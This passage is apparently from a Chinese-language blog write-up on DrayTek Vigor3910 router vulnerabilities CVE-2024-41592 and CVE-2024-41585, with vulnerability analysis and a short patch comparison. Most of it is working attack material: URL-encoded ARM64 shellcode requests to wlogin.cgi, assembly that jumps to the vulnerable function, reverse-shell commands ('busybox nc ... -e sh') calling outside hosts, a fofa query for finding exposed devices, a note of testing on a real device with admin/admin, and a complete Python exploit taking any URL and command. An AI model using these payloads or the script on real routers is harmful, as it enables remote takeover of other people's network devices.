<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">反弹shell到<span class="number">192.168</span><span class="number">.2</span><span class="number">.135</span>:<span class="number">4444</span>端口</span><br><span class="line">http:<span class="comment">//192.168.1.1/cgi-bin/wlogin.cgi?a=1&amp;a=2&amp;a=3&amp;a=4&amp;a=5&amp;a=6&amp;a=7&amp;a=8&amp;a=9&amp;a=10&amp;a=11&amp;a=12&amp;a=13&amp;a=14&amp;a=15&amp;a=16&amp;a=17&amp;a=18&amp;a=19&amp;a=20&amp;a=21&amp;%40%00%80%d2%21%00%80%d2%02%00%80%d2%c8%18%80%d2%01%00%00%d4%f3%03%00%aa%41%02%00%10%02%02%80%d2%68%19%80%d2%01%00%00%d4%e0%03%13%aa%08%03%80%d2%02%00%80%d2%41%00%80%d2%01%00%00%d4%21%00%80%d2%01%00%00%d4%01%00%80%d2%01%00%00%d4%e0%00%00%10%01%00%80%d2%02%00%80%d2%a8%1b%80%d2%01%00%00%d4%02%00%11%5c%c0%a8%02%87%2f%62%69%6e%2f%73%68%00</span></span><br><span class="line"></span><br><span class="line">执行/bin/sh</span><br><span class="line">http:<span class="comment">//192.168.1.1/cgi-bin/wlogin.cgi?a=1&amp;a=2&amp;a=3&amp;a=4&amp;a=5&amp;a=6&amp;a=7&amp;a=8&amp;a=9&amp;a=10&amp;a=11&amp;a=12&amp;a=13&amp;a=14&amp;a=15&amp;a=16&amp;a=17&amp;a=18&amp;a=19&amp;a=20&amp;a=21&amp;%e1%45%8c%d2%21%cd%ad%f2%e1%65%ce%f2%01%0d%e0%f2%e1%8f%1f%f8%e1%03%1f%aa%e2%03%1f%aa%e0%63%21%8b%a8%1b%80%d2%e1%66%02%d4</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//192.168.1.1/cgi-bin/wlogin.cgi?a=1&amp;a=2&amp;a=3&amp;a=4&amp;a=5&amp;a=6&amp;a=7&amp;a=8&amp;a=9&amp;a=10&amp;a=11&amp;a=12&amp;a=13&amp;a=14&amp;a=15&amp;a=16&amp;a=17&amp;a=18&amp;a=19&amp;a=20&amp;a=21&amp;[shellcode_%]</span></span><br><span class="line"></span><br><span class="line">反弹shell到<span class="number">198.46</span><span class="number">.249</span><span class="number">.106</span>:<span class="number">4444</span>端口</span><br><span class="line">nc -lvnp <span class="number">4444</span></span><br><span class="line">/cgi-bin/wlogin.cgi?a=<span class="number">1</span>&amp;a=<span class="number">2</span>&amp;a=<span class="number">3</span>&amp;a=<span class="number">4</span>&amp;a=<span class="number">5</span>&amp;a=<span class="number">6</span>&amp;a=<span class="number">7</span>&amp;a=<span class="number">8</span>&amp;a=<span class="number">9</span>&amp;a=<span class="number">10</span>&amp;a=<span class="number">11</span>&amp;a=<span class="number">12</span>&amp;a=<span class="number">13</span>&amp;a=<span class="number">14</span>&amp;a=<span class="number">15</span>&amp;a=<span class="number">16</span>&amp;a=<span class="number">17</span>&amp;a=<span class="number">18</span>&amp;a=<span class="number">19</span>&amp;a=<span class="number">20</span>&amp;a=<span class="number">21</span>&amp;%<span class="number">20</span>%<span class="number">00</span>%<span class="number">80</span>%d2%<span class="number">41</span>%<span class="number">00</span>%<span class="number">80</span>%d2%<span class="number">02</span>%<span class="number">00</span>%<span class="number">80</span>%d2%c8%<span class="number">18</span>%<span class="number">80</span>%d2%<span class="number">01</span>%<span class="number">00</span>%<span class="number">00</span>%d4%f3%<span class="number">03</span>%<span class="number">00</span>%aa%<span class="number">21</span>%<span class="number">02</span>%<span class="number">00</span>%<span class="number">10</span>%<span class="number">02</span>%<span class="number">02</span>%<span class="number">80</span>%d2%<span class="number">68</span>%<span class="number">19</span>%<span class="number">80</span>%d2%<span class="number">01</span>%<span class="number">00</span>%<span class="number">00</span>%d4%e0%<span class="number">03</span>%<span class="number">13</span>%aa%<span class="number">01</span>%<span class="number">00</span>%<span class="number">80</span>%d2%e8%<span class="number">02</span>%<span class="number">80</span>%d2%<span class="number">01</span>%<span class="number">00</span>%<span class="number">00</span>%d4%<span class="number">21</span>%<span class="number">00</span>%<span class="number">80</span>%d2%<span class="number">01</span>%<span class="number">00</span>%<span class="number">00</span>%d4%<span class="number">41</span>%<span class="number">00</span>%<span class="number">80</span>%d2%<span class="number">01</span>%<span class="number">00</span>%<span class="number">00</span>%d4%e0%<span class="number">00</span>%<span class="number">00</span>%<span class="number">10</span>%<span class="number">01</span>%<span class="number">00</span>%<span class="number">80</span>%d2%<span class="number">02</span>%<span class="number">00</span>%<span class="number">80</span>%d2%a8%1b%<span class="number">80</span>%d2%<span class="number">01</span>%<span class="number">00</span>%<span class="number">00</span>%d4%<span class="number">02</span>%<span class="number">00</span>%<span class="number">11</span>%5c%6a%f9%2e%c6%<span class="number">2f</span>%<span class="number">62</span>%<span class="number">69</span>%6e%<span class="number">2f</span>%<span class="number">73</span>%<span class="number">68</span>%<span class="number">00</span></span><br></pre></td></tr></table></figure>

<p>但执行<code>shellcode</code>到<code>svc #0</code>时，程序触发异常，程序重启陷入死循环，因此此路不通</p>
<p><img src="/images/xMGUxYzQ3NTlfTUNWYXFCV2hBOTNSVjRTeEYwNHE4akIxbk.png" alt="img"></p>
<p><img src="/images/MzlfWjVJTENCQ3lnY2FJdjlsU21neFdBSmtTMmJHN2pYNHNfVG9rZW46VzJQZGJDN0tib01JNm14OEtkZ2NtU1p0bjJkXzE3NDAzMDE4ODI6MTc0MDMw.png" alt="img"></p>
<p>怀疑在执行<code>shellcode</code>的时候，程序存在<code>drayos</code>系统中，需要越狱跳转到<code>Linux</code>环境下才可以正常执行<code>shellcode</code></p>
<h5 id="采用思路二："><a href="#采用思路二：" class="headerlink" title="采用思路二："></a>采用思路二：</h5><p>控制参数<code>x0=cmd_addr</code>，<code>x1=0x0</code>，最后跳转到<code>virtcons_out</code>函数，触发<code>CVE-2024-41585</code>漏洞进行命令执行，同时控制返回地址到<code>/cgi-bin/wlogin.cgi</code>请求的正常返回地址，保证程序不崩溃</p>
<p>控制程序执行流执行<code>printf</code>函数，执行后跳转到<code>/cgi-bin/wlogin.cgi</code>请求的正常返回地址，可以发现正常程序执行<code>printf</code>函数被成功调用，并且程序没有崩溃，<code>web</code>界面刷新正常</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">_start:</span><br><span class="line">    <span class="comment">// x0 = 地址(字符串位置)</span></span><br><span class="line">    adr x0, command_string   <span class="comment">// 把字符串的地址加载到x0中</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// x1 = 0</span></span><br><span class="line">    mov x1, #<span class="number">0</span>               <span class="comment">// 把x1设置为0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// x7 = 0x40D587B0</span></span><br><span class="line">    movz x7, #<span class="number">0x87B0</span>         <span class="comment">// 把0x87B0加载到x7的低16位</span></span><br><span class="line">    movk x7, #<span class="number">0x40D5</span>, lsl #<span class="number">16</span> <span class="comment">// 把0x40D5加载到x7的高16位</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment">// x30 = 0x40160dac</span></span><br><span class="line">    movz x30, #<span class="number">0x0dac</span>         <span class="comment">// 把0xdac加载到x30的低16位</span></span><br><span class="line">    movk x30, #<span class="number">0x4016</span>, lsl #<span class="number">16</span> <span class="comment">// 把0x4016加载到x30的高16位</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 跳转到x7</span></span><br><span class="line">    br x7                    <span class="comment">// 执行x7寄存器地址处的指令</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 数据部分</span></span><br><span class="line">command_string:</span><br><span class="line">    .asciz <span class="string">&quot;set_linux_time ;busybox nc 192.168.2.135 1234 -e sh;&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/l9WNA.png" alt="img"></p>
<p>对应的<code>exp</code>如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.1.1/cgi-bin/wlogin.cgi?&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%e0%00%00%10%01%00%80%d2%07%f6%90%d2%a7%1a%a8%f2%9e%b5%81%d2%de%02%a8%f2%e0%00%1f%d6%73%65%74%5f%6c%69%6e%75%78%5f%74%69%6d%65%20%3b%62%75%73%79%62%6f%78%20%6e%63%20%31%39%32%2e%31%36%38%2e%32%2e%31%33%35%20%31%32%33%34%20%2d%65%20%73%68%3b%00</span></span><br></pre></td></tr></table></figure>

<p>验证合理后，控制执行流指向到<code>virtcons_out</code>函数，触发<code>CVE-2024-41585</code>漏洞进行命令执行</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.section .data</span><br><span class="line">.text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    <span class="comment">// x0 = 地址(字符串位置)</span></span><br><span class="line">    adr x0, command_string   <span class="comment">// 把字符串的地址加载到x0中</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// x1 = 0</span></span><br><span class="line">    mov x1, #<span class="number">0</span>               <span class="comment">// 把x1设置为0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// x7 = 0x40030068</span></span><br><span class="line">    movz x7, #<span class="number">0x0068</span>         <span class="comment">// 把0x68加载到x7的低16位</span></span><br><span class="line">    movk x7, #<span class="number">0x4003</span>, lsl #<span class="number">16</span> <span class="comment">// 把0x4003加载到x7的高16位</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// x30 = 0x40160dac</span></span><br><span class="line">    movz x30, #<span class="number">0x0dac</span>         <span class="comment">// 把0xdac加载到x30的低16位</span></span><br><span class="line">    movk x30, #<span class="number">0x4016</span>, lsl #<span class="number">16</span> <span class="comment">// 把0x4016加载到x30的高16位</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 跳转到x7</span></span><br><span class="line">    br x7                    <span class="comment">// 执行x7寄存器地址处的指令</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 数据部分</span></span><br><span class="line">command_string:</span><br><span class="line">    .asciz <span class="string">&quot;set_linux_time ;busybox nc 192.168.2.135 1234 -e sh;&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/NkblpkXzE3NDAzMDE4ODI6MTc0MDMwNTQ4Ml9WNA.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.1/cgi-bin/wlogin.cgi?&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%e0%00%00%10%01%00%80%d2%07%0d%80%d2%67%00%a8%f2%9e%b5%81%d2%de%02%a8%f2%e0%00%1f%d6set_linux_time%20%3Bifconfig%20br-wan3%20192.169.2.152%3B</span><br><span class="line"></span><br><span class="line">http://192.168.1.1/cgi-bin/wlogin.cgi?&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%e0%00%00%10%01%00%80%d2%07%0d%80%d2%67%00%a8%f2%9e%b5%81%d2%de%02%a8%f2%e0%00%1f%d6set_linux_time%20%3Bbusybox%20nc%20192.168.2.135%201234%20-e%20sh%3B</span><br><span class="line"></span><br><span class="line">http://192.168.1.1/cgi-bin/wlogin.cgi?&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%e0%00%00%10%01%00%80%d2%07%0d%80%d2%67%00%a8%f2%9e%b5%81%d2%de%02%a8%f2%e0%00%1f%d6set_linux_time%20%3Bifconfig%20br-wan4%20192.169.42.42%3B</span><br><span class="line"></span><br><span class="line">http://192.168.1.1/cgi-bin/wlogin.cgi?&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%e0%00%00%10%01%00%80%d2%07%0d%80%d2%67%00%a8%f2%9e%b5%81%d2%de%02%a8%f2%e0%00%1f%d6set_linux_time%20%3Bbusybox%20ping%20198.46.249.106%3B</span><br><span class="line"></span><br><span class="line">http://192.168.1.1/cgi-bin/wlogin.cgi?&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%e0%00%00%10%01%00%80%d2%07%0d%80%d2%67%00%a8%f2%9e%b5%81%d2%de%02%a8%f2%e0%00%1f%d6set_linux_time%20%3Bbusybox%20nc%20198.46.249.106%204444%20-e%20sh%3B</span><br></pre></td></tr></table></figure>

<p><img src="/images/2YzNTJfUHBsN1A0UXR4N2hJbXI1M2hUcWJVOHFHVThCaXp4UmpfVG9rZW46T25TVmJOU1Y4b3doUHV4Z2dHMWNQeHV6bjJlXzE3NDAzM.png" alt="img"></p>
<p>注意：模拟环境中<code>recvCmd</code>进程没有正常启动导致命令无法执行，下面是真机测试</p>
<p><a target="_blank" rel="noopener" href="https://xx.xx.xx.xx/weblogin.htm">https://xx.xx.xx.xx/weblogin.htm</a>  弱密码：<code>admin/admin</code></p>
<p>执行调用<code>printf</code>测试，<code>web</code>界面正常刷新，<code>telnet</code>无影响</p>
<p><img src="/images/image-20250223171908085.png" alt="image-20250223171908085"></p>
<p><img src="/images/wNTQ4Ml9WNA.png" alt="img"></p>
<p>执行<code>reboot</code>命令，<code>web</code>界面无响应，<code>telnet</code>断开</p>
<p><img src="/images/image-20250223171943112.png" alt="image-20250223171943112"></p>
<p><img src="/images/3NDAzMDE4ODI6MTc0MDMwNTQ4Ml9WNA55.png" alt="img"></p>
<p><code>getshell</code>失败，通过<code>telnet</code>中的<code>ip ping IP</code>的命令可以<code>ping</code>通目标服务器，但通过漏洞无法<code>ping</code>通，猜测是路由器自身防火墙策略问题，</p>
<p><img src="/images/image-20250223172016648.png" alt="image-20250223172016648"></p>
<h4 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from urllib.parse import quote</span><br><span class="line"></span><br><span class="line">url = input(<span class="string">&quot;input url: &quot;</span>)</span><br><span class="line">cmd = input(<span class="string">&quot;input cmd: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;http://&quot;</span> not <span class="keyword">in</span> url and <span class="string">&quot;https://&quot;</span> not <span class="keyword">in</span> url:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;url格式错误，eg：https//:ip or http://ip&quot;</span>)</span><br><span class="line"></span><br><span class="line">cmd = quote(cmd)</span><br><span class="line">url = url + <span class="string">&quot;/cgi-bin/wlogin.cgi?&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;%e0%00%00%10%01%00%80%d2%07%0d%80%d2%67%00%a8%f2%9e%b5%81%d2%de%02%a8%f2%e0%00%1f%d6set_linux_time%20%3Bbusybox%20&quot;</span> + cmd + <span class="string">&quot;%3B&quot;</span></span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    <span class="comment"># 发送 GET 请求并禁用 SSL 认证</span></span><br><span class="line">    response = requests.get(url, verify=False, <span class="built_in">timeout</span>=10)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">except requests.RequestException as e:</span><br><span class="line">    <span class="comment"># 如果发生异常，打印错误并跳过该 URL</span></span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">&#x27;Error accessing &#123;url&#125;: &#123;e&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>固件版本：<code>Vigor3910_v4.3.2.8</code></p>
<p>循环时对长度进行了校验</p>
<p><img src="/images/gxNTkzYzlfZGdDcnFnTDVFc1praTNwWVhYUlRYeEpvemJ5OElRb1BfVG9rZW46UFUwYWJSb2hZb1doOWN4NWVxaWNDUExv.png" alt="img"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><h4 id="“键”释放问题"><a href="#“键”释放问题" class="headerlink" title="“键”释放问题"></a>“键”释放问题</h4><p>键值对对栈空间覆盖之后，会调用<code>FreeCtrlName</code>函数对”键”值进行释放，理论上是对全部”键”值进行释放，但调试发现并不是全部释放，因此不会导致我们后续的返回地址的覆盖</p>
<p><img src="/images/MTRhNzRfbWt0Y1RBU0.png" alt="img"></p>
<p><img src="/images/MTc0MDM36.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ( !sub_40BC1690(v81, v80 + 496, v82) ) // 漏洞点 </span><br><span class="line">&#123; </span><br><span class="line">	sub_400BCD80(*(v81 + 0xCLL), &quot;Location: /doc/cgierr.htm\n\n&quot;, 256LL); </span><br><span class="line">	return FreeCtrlName(v80 + 496); // 释放所有的&quot;键&quot; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>sub_40BC1690</code>执行后<img src="/images/mE1MTFkZWIyMTk0N2RfN2p36.png" alt="img"><code>FreeCtrlName</code>执行后<img src="/images/zNiOGY4ZTgxMWZfYzFJUHZ4RWV54.png" alt="img"></p>
<p>上面是调试细节，可以看到不会对”键”全部释放</p>
<h2 id="CVE-2024-41585"><a href="#CVE-2024-41585" class="headerlink" title="CVE-2024-41585"></a>CVE-2024-41585</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>漏洞描述：<code>DrayTek Vigor3910</code>设备版本至<code>4.3.2.6</code>存在操作系统命令注入漏洞，攻击者可利用<code>recvCmd</code>二进制文件逃离模拟实例并向主机注入任意命令。</p>
<p>漏洞组件：<code>recvCmd</code></p>
<p>漏洞类型：命令执行</p>
<p>影响范围：<code>EoL</code>（<code>End of Life</code> 停止维护）版本仅包含<code>CVE-2024-41592</code>的修复程序，<code>Fixed Versions</code>代表漏洞修复的版本</p>
<p><img src="/images/image-20250223172504121.png" alt="image-20250223172504121"></p>
<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>固件版本：<code>Vigor3910_v3.9.7.2</code></p>
<p>fofa：<code>&quot;Vigor 3910&quot; &amp;&amp; title==&quot;Vigor Login Page&quot;</code></p>
<p>标志：<code>var buildtime=&quot;Dec 21 2021 17:26:18&quot;;</code></p>
<h4 id="整体分析："><a href="#整体分析：" class="headerlink" title="整体分析："></a><strong>整体分析：</strong></h4><p>在一些<code>DrayTek</code>设备上，虽然用户无法访问主机操作系统，但 <code>guest</code>可以与主机进行通信。例如，当用户请求重新启动<code>DrayOS</code>时，客户机会向主机发送一条消息，要求它重新启动客户机。这个通信通道是由客户机通过一个虚拟串行接口用一个特殊的函数“<code>virtcons_out()</code>”(用于“<code>reboot</code>”等 <code>OS</code>命令)实现的。主机使用一个名为“<code>recvCmd</code>”的特殊二进制文件来监听这个虚拟串行接口，并执行客户机请求 的命令。 </p>
<h4 id="细节分析："><a href="#细节分析：" class="headerlink" title="细节分析："></a><strong>细节分析：</strong></h4><p>分析<code>recvCmd</code></p>
<p><code>main</code>函数分析</p>
<p>读取<code>command_list</code>获取可执行命令列表，空格变<code>\n</code>保存到<code>ptr</code>变量中，我们通过<code>virtcons_out()</code>传递的命令保存在<code>/firmware/serial0</code>文件中，通过读取<code>/firmware/serial0</code>文件获取命令，每次读取<code>64</code>字节，然后传递给<code>sub_400FB0</code>函数</p>
<p>其中<code>/etc/runcommand/command_list</code>中保存了命令列表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reboot fw_upload gci_exp quit set_linux_time sethostlan setportspeed update_ps backup_soho setadminpass f2 set_board_info halt usbcmd uffssave</span><br></pre></td></tr></table></figure>

<p><img src="/images/Ta3JSbnVlXzE3NDAzMDE4ODI6MTc0MDMwNTQ4.png" alt="img"></p>
<p>跟进<code>sub_400FB0</code>函数，遍历传入的命令字符串到第一个<code>\n</code>或者空格的长度，保存到<code>len_0</code></p>
<p><img src="/images/Ta3JSbnVlXzE3NDAzMDE4ODI6MTc0MDMwNTQ425.png" alt="img"></p>
<p>判断我们输入的命令是否在漏洞列表中，如果在跳出循环，传递到<code>sub_400F08</code>函数</p>
<p><img src="/images/Ta3JSbnVlXzE3NDAzMDE4ODI6MTc0MDMwNTQ4369.png" alt="img"></p>
<p>跟进<code>sub_400F08</code>函数，对我们的输入的命令进行过滤，在<code>19-37</code>行，将命令中的<code>\n</code>替换为<code>空格</code>，过滤不严格造成命令执行漏洞</p>
<p><img src="/images/Ta3JSbnVlXzE3NDAzMDE4ODI6MTc0MDMwNTQ42541.png" alt="img"></p>
<p><code>busybox</code>命令列表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ , [[, acpid, addgroup, adduser, arp, arping, ash, awk, basename, blkdiscard, blkid, blockdev, brctl, bunzip2, bzcat, bzip2, cal, cat, chattr, chgrp, chmod, chown, chpst, chroot, cksum, clear, cmp, comm, cp, crond, crontab, cttyhack, cut, date, dc, dd, delgroup, deluser, depmod, devmem, devstatus, df, dhcprelay, diff, dirname, dmesg, dnsdomainname, du, dumpleases, echo, egrep, env, expr, false, fatattr, fdflush, fdisk, fgrep, find, findfs, flash_eraseall, flash_lock, flash_unlock, flashcp, flock, fold, free, freeramdisk, fsck, fstrim, fsync, ftpd, ftpget, ftpput, fuser, getopt, getty, grep, groups, gunzip, gzip, halt, hd, hdparm, head, hexdump, hostid, httpd, hwclock, i2cdetect, i2cdump, i2cget, i2cset, id, ifconfig, ifdown, ifenslave, ifup, inetd, init, insmod, install, ionice, iostat, ip, ipaddr, ipcalc, ipcrm, ipcs, iplink, ipneigh, iproute, iptunnel, kill, killall, klogd, last, less, linux32, linux64, linuxrc, ln, logger, login, logread, ls, lsmod, lsof, lsusb, lzcat, makedevs, md5sum, mesg, mkdir, mkdosfs, mke2fs, mkfifo, mkfs.vfat, mknod, mkpasswd, mkswap, mktemp, modinfo, modprobe, more, mount, mountpoint, mv, nanddump, nandwrite, nc, netstat, nice, nsenter, nslookup, ntpd, od, openvt, passwd, patch, pgrep, pidof, ping, ping6, pipe_progress, pkill, pmap, poweroff, powertop, printenv, printf, ps, pscan, pwd, readlink, realpath, reboot, renice, reset, resize, rev, rm, rmdir, rmmod, route, rtcwake, runlevel, runsv, script, sed, sendmail, seq, setconsole, setlogcons, setsid, setuidgid, sh, showkey, shuf, sleep, smemcap, softlimit, sort, split, stat, strings, stty, su, sulogin, sum, sv, svc, svlogd, swapoff, swapon, sync, sysctl, syslogd, tail, tar, taskset, tcpsvd, tee, telnet, telnetd, test, tftp, tftpd, time, timeout, top, touch, tr, traceroute, traceroute6, true, truncate, tty, ttysize, ubiattach, ubidetach, ubimkvol, ubirename, ubirmvol, ubirsvol, ubiupdatevol, udhcpc, udhcpd, uevent, umount, uname, unlink, unshare, unzip, uptime, usleep, vconfig, vi, wall, watch, watchdog, wc, wget, which, whoami, xargs, xzcat, yes, zcat</span><br></pre></td></tr></table></figure>

<p>动态调试分析<code>virtcons_out</code>函数，发现限制长度<code>63</code>，<code>virtcons_out</code>函数接收俩个参数<code>a1=cmd_addr</code>，<code>a2=0x0</code></p>
<p><img src="/images/Ta3JSbnVlXzE3NDAzMDE4ODI6MTc0MDMwNTQ41234.png" alt="img"></p>
<p><img src="/images/Ta3JSbnVlXzE3NDAzMDE4ODI6MTc0MDMwNTQ412345.png" alt="img"></p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://wzt.ac.cn/2024/02/19/vigor_3910/">https://wzt.ac.cn/2024/02/19/vigor_3910/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.forescout.com/resources/draybreak-draytek-research/">https://www.forescout.com/resources/draybreak-draytek-research/</a></p>
<p><a target="_blank" rel="noopener" href="https://packetstormsecurity.com/files/153464/Linux-ARM64-Reverse-TCP-Shell-Null-Free-Shellcode.html">https://packetstormsecurity.com/files/153464/Linux-ARM64-Reverse-TCP-Shell-Null-Free-Shellcode.html</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/k0mor3b1">Projects</a></li>
        
          <li><a href="/links/">links</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2024-41592"><span class="toc-number">1.</span> <span class="toc-text">CVE-2024-41592</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.3.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poc-exp"><span class="toc-number">1.4.</span> <span class="toc-text">poc&#x2F;exp</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PoC"><span class="toc-number">1.4.1.</span> <span class="toc-text">PoC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP"><span class="toc-number">1.4.2.</span> <span class="toc-text">EXP</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%87%87%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B8%80%EF%BC%9A%EF%BC%88%E4%B8%8D%E9%80%9A%EF%BC%89"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">采用思路一：（不通）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%87%87%E7%94%A8%E6%80%9D%E8%B7%AF%E4%BA%8C%EF%BC%9A"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">采用思路二：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4EXP"><span class="toc-number">1.4.3.</span> <span class="toc-text">完整EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="toc-number">1.5.</span> <span class="toc-text">补丁分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.6.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%80%9C%E9%94%AE%E2%80%9D%E9%87%8A%E6%94%BE%E9%97%AE%E9%A2%98"><span class="toc-number">1.6.1.</span> <span class="toc-text">“键”释放问题</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a 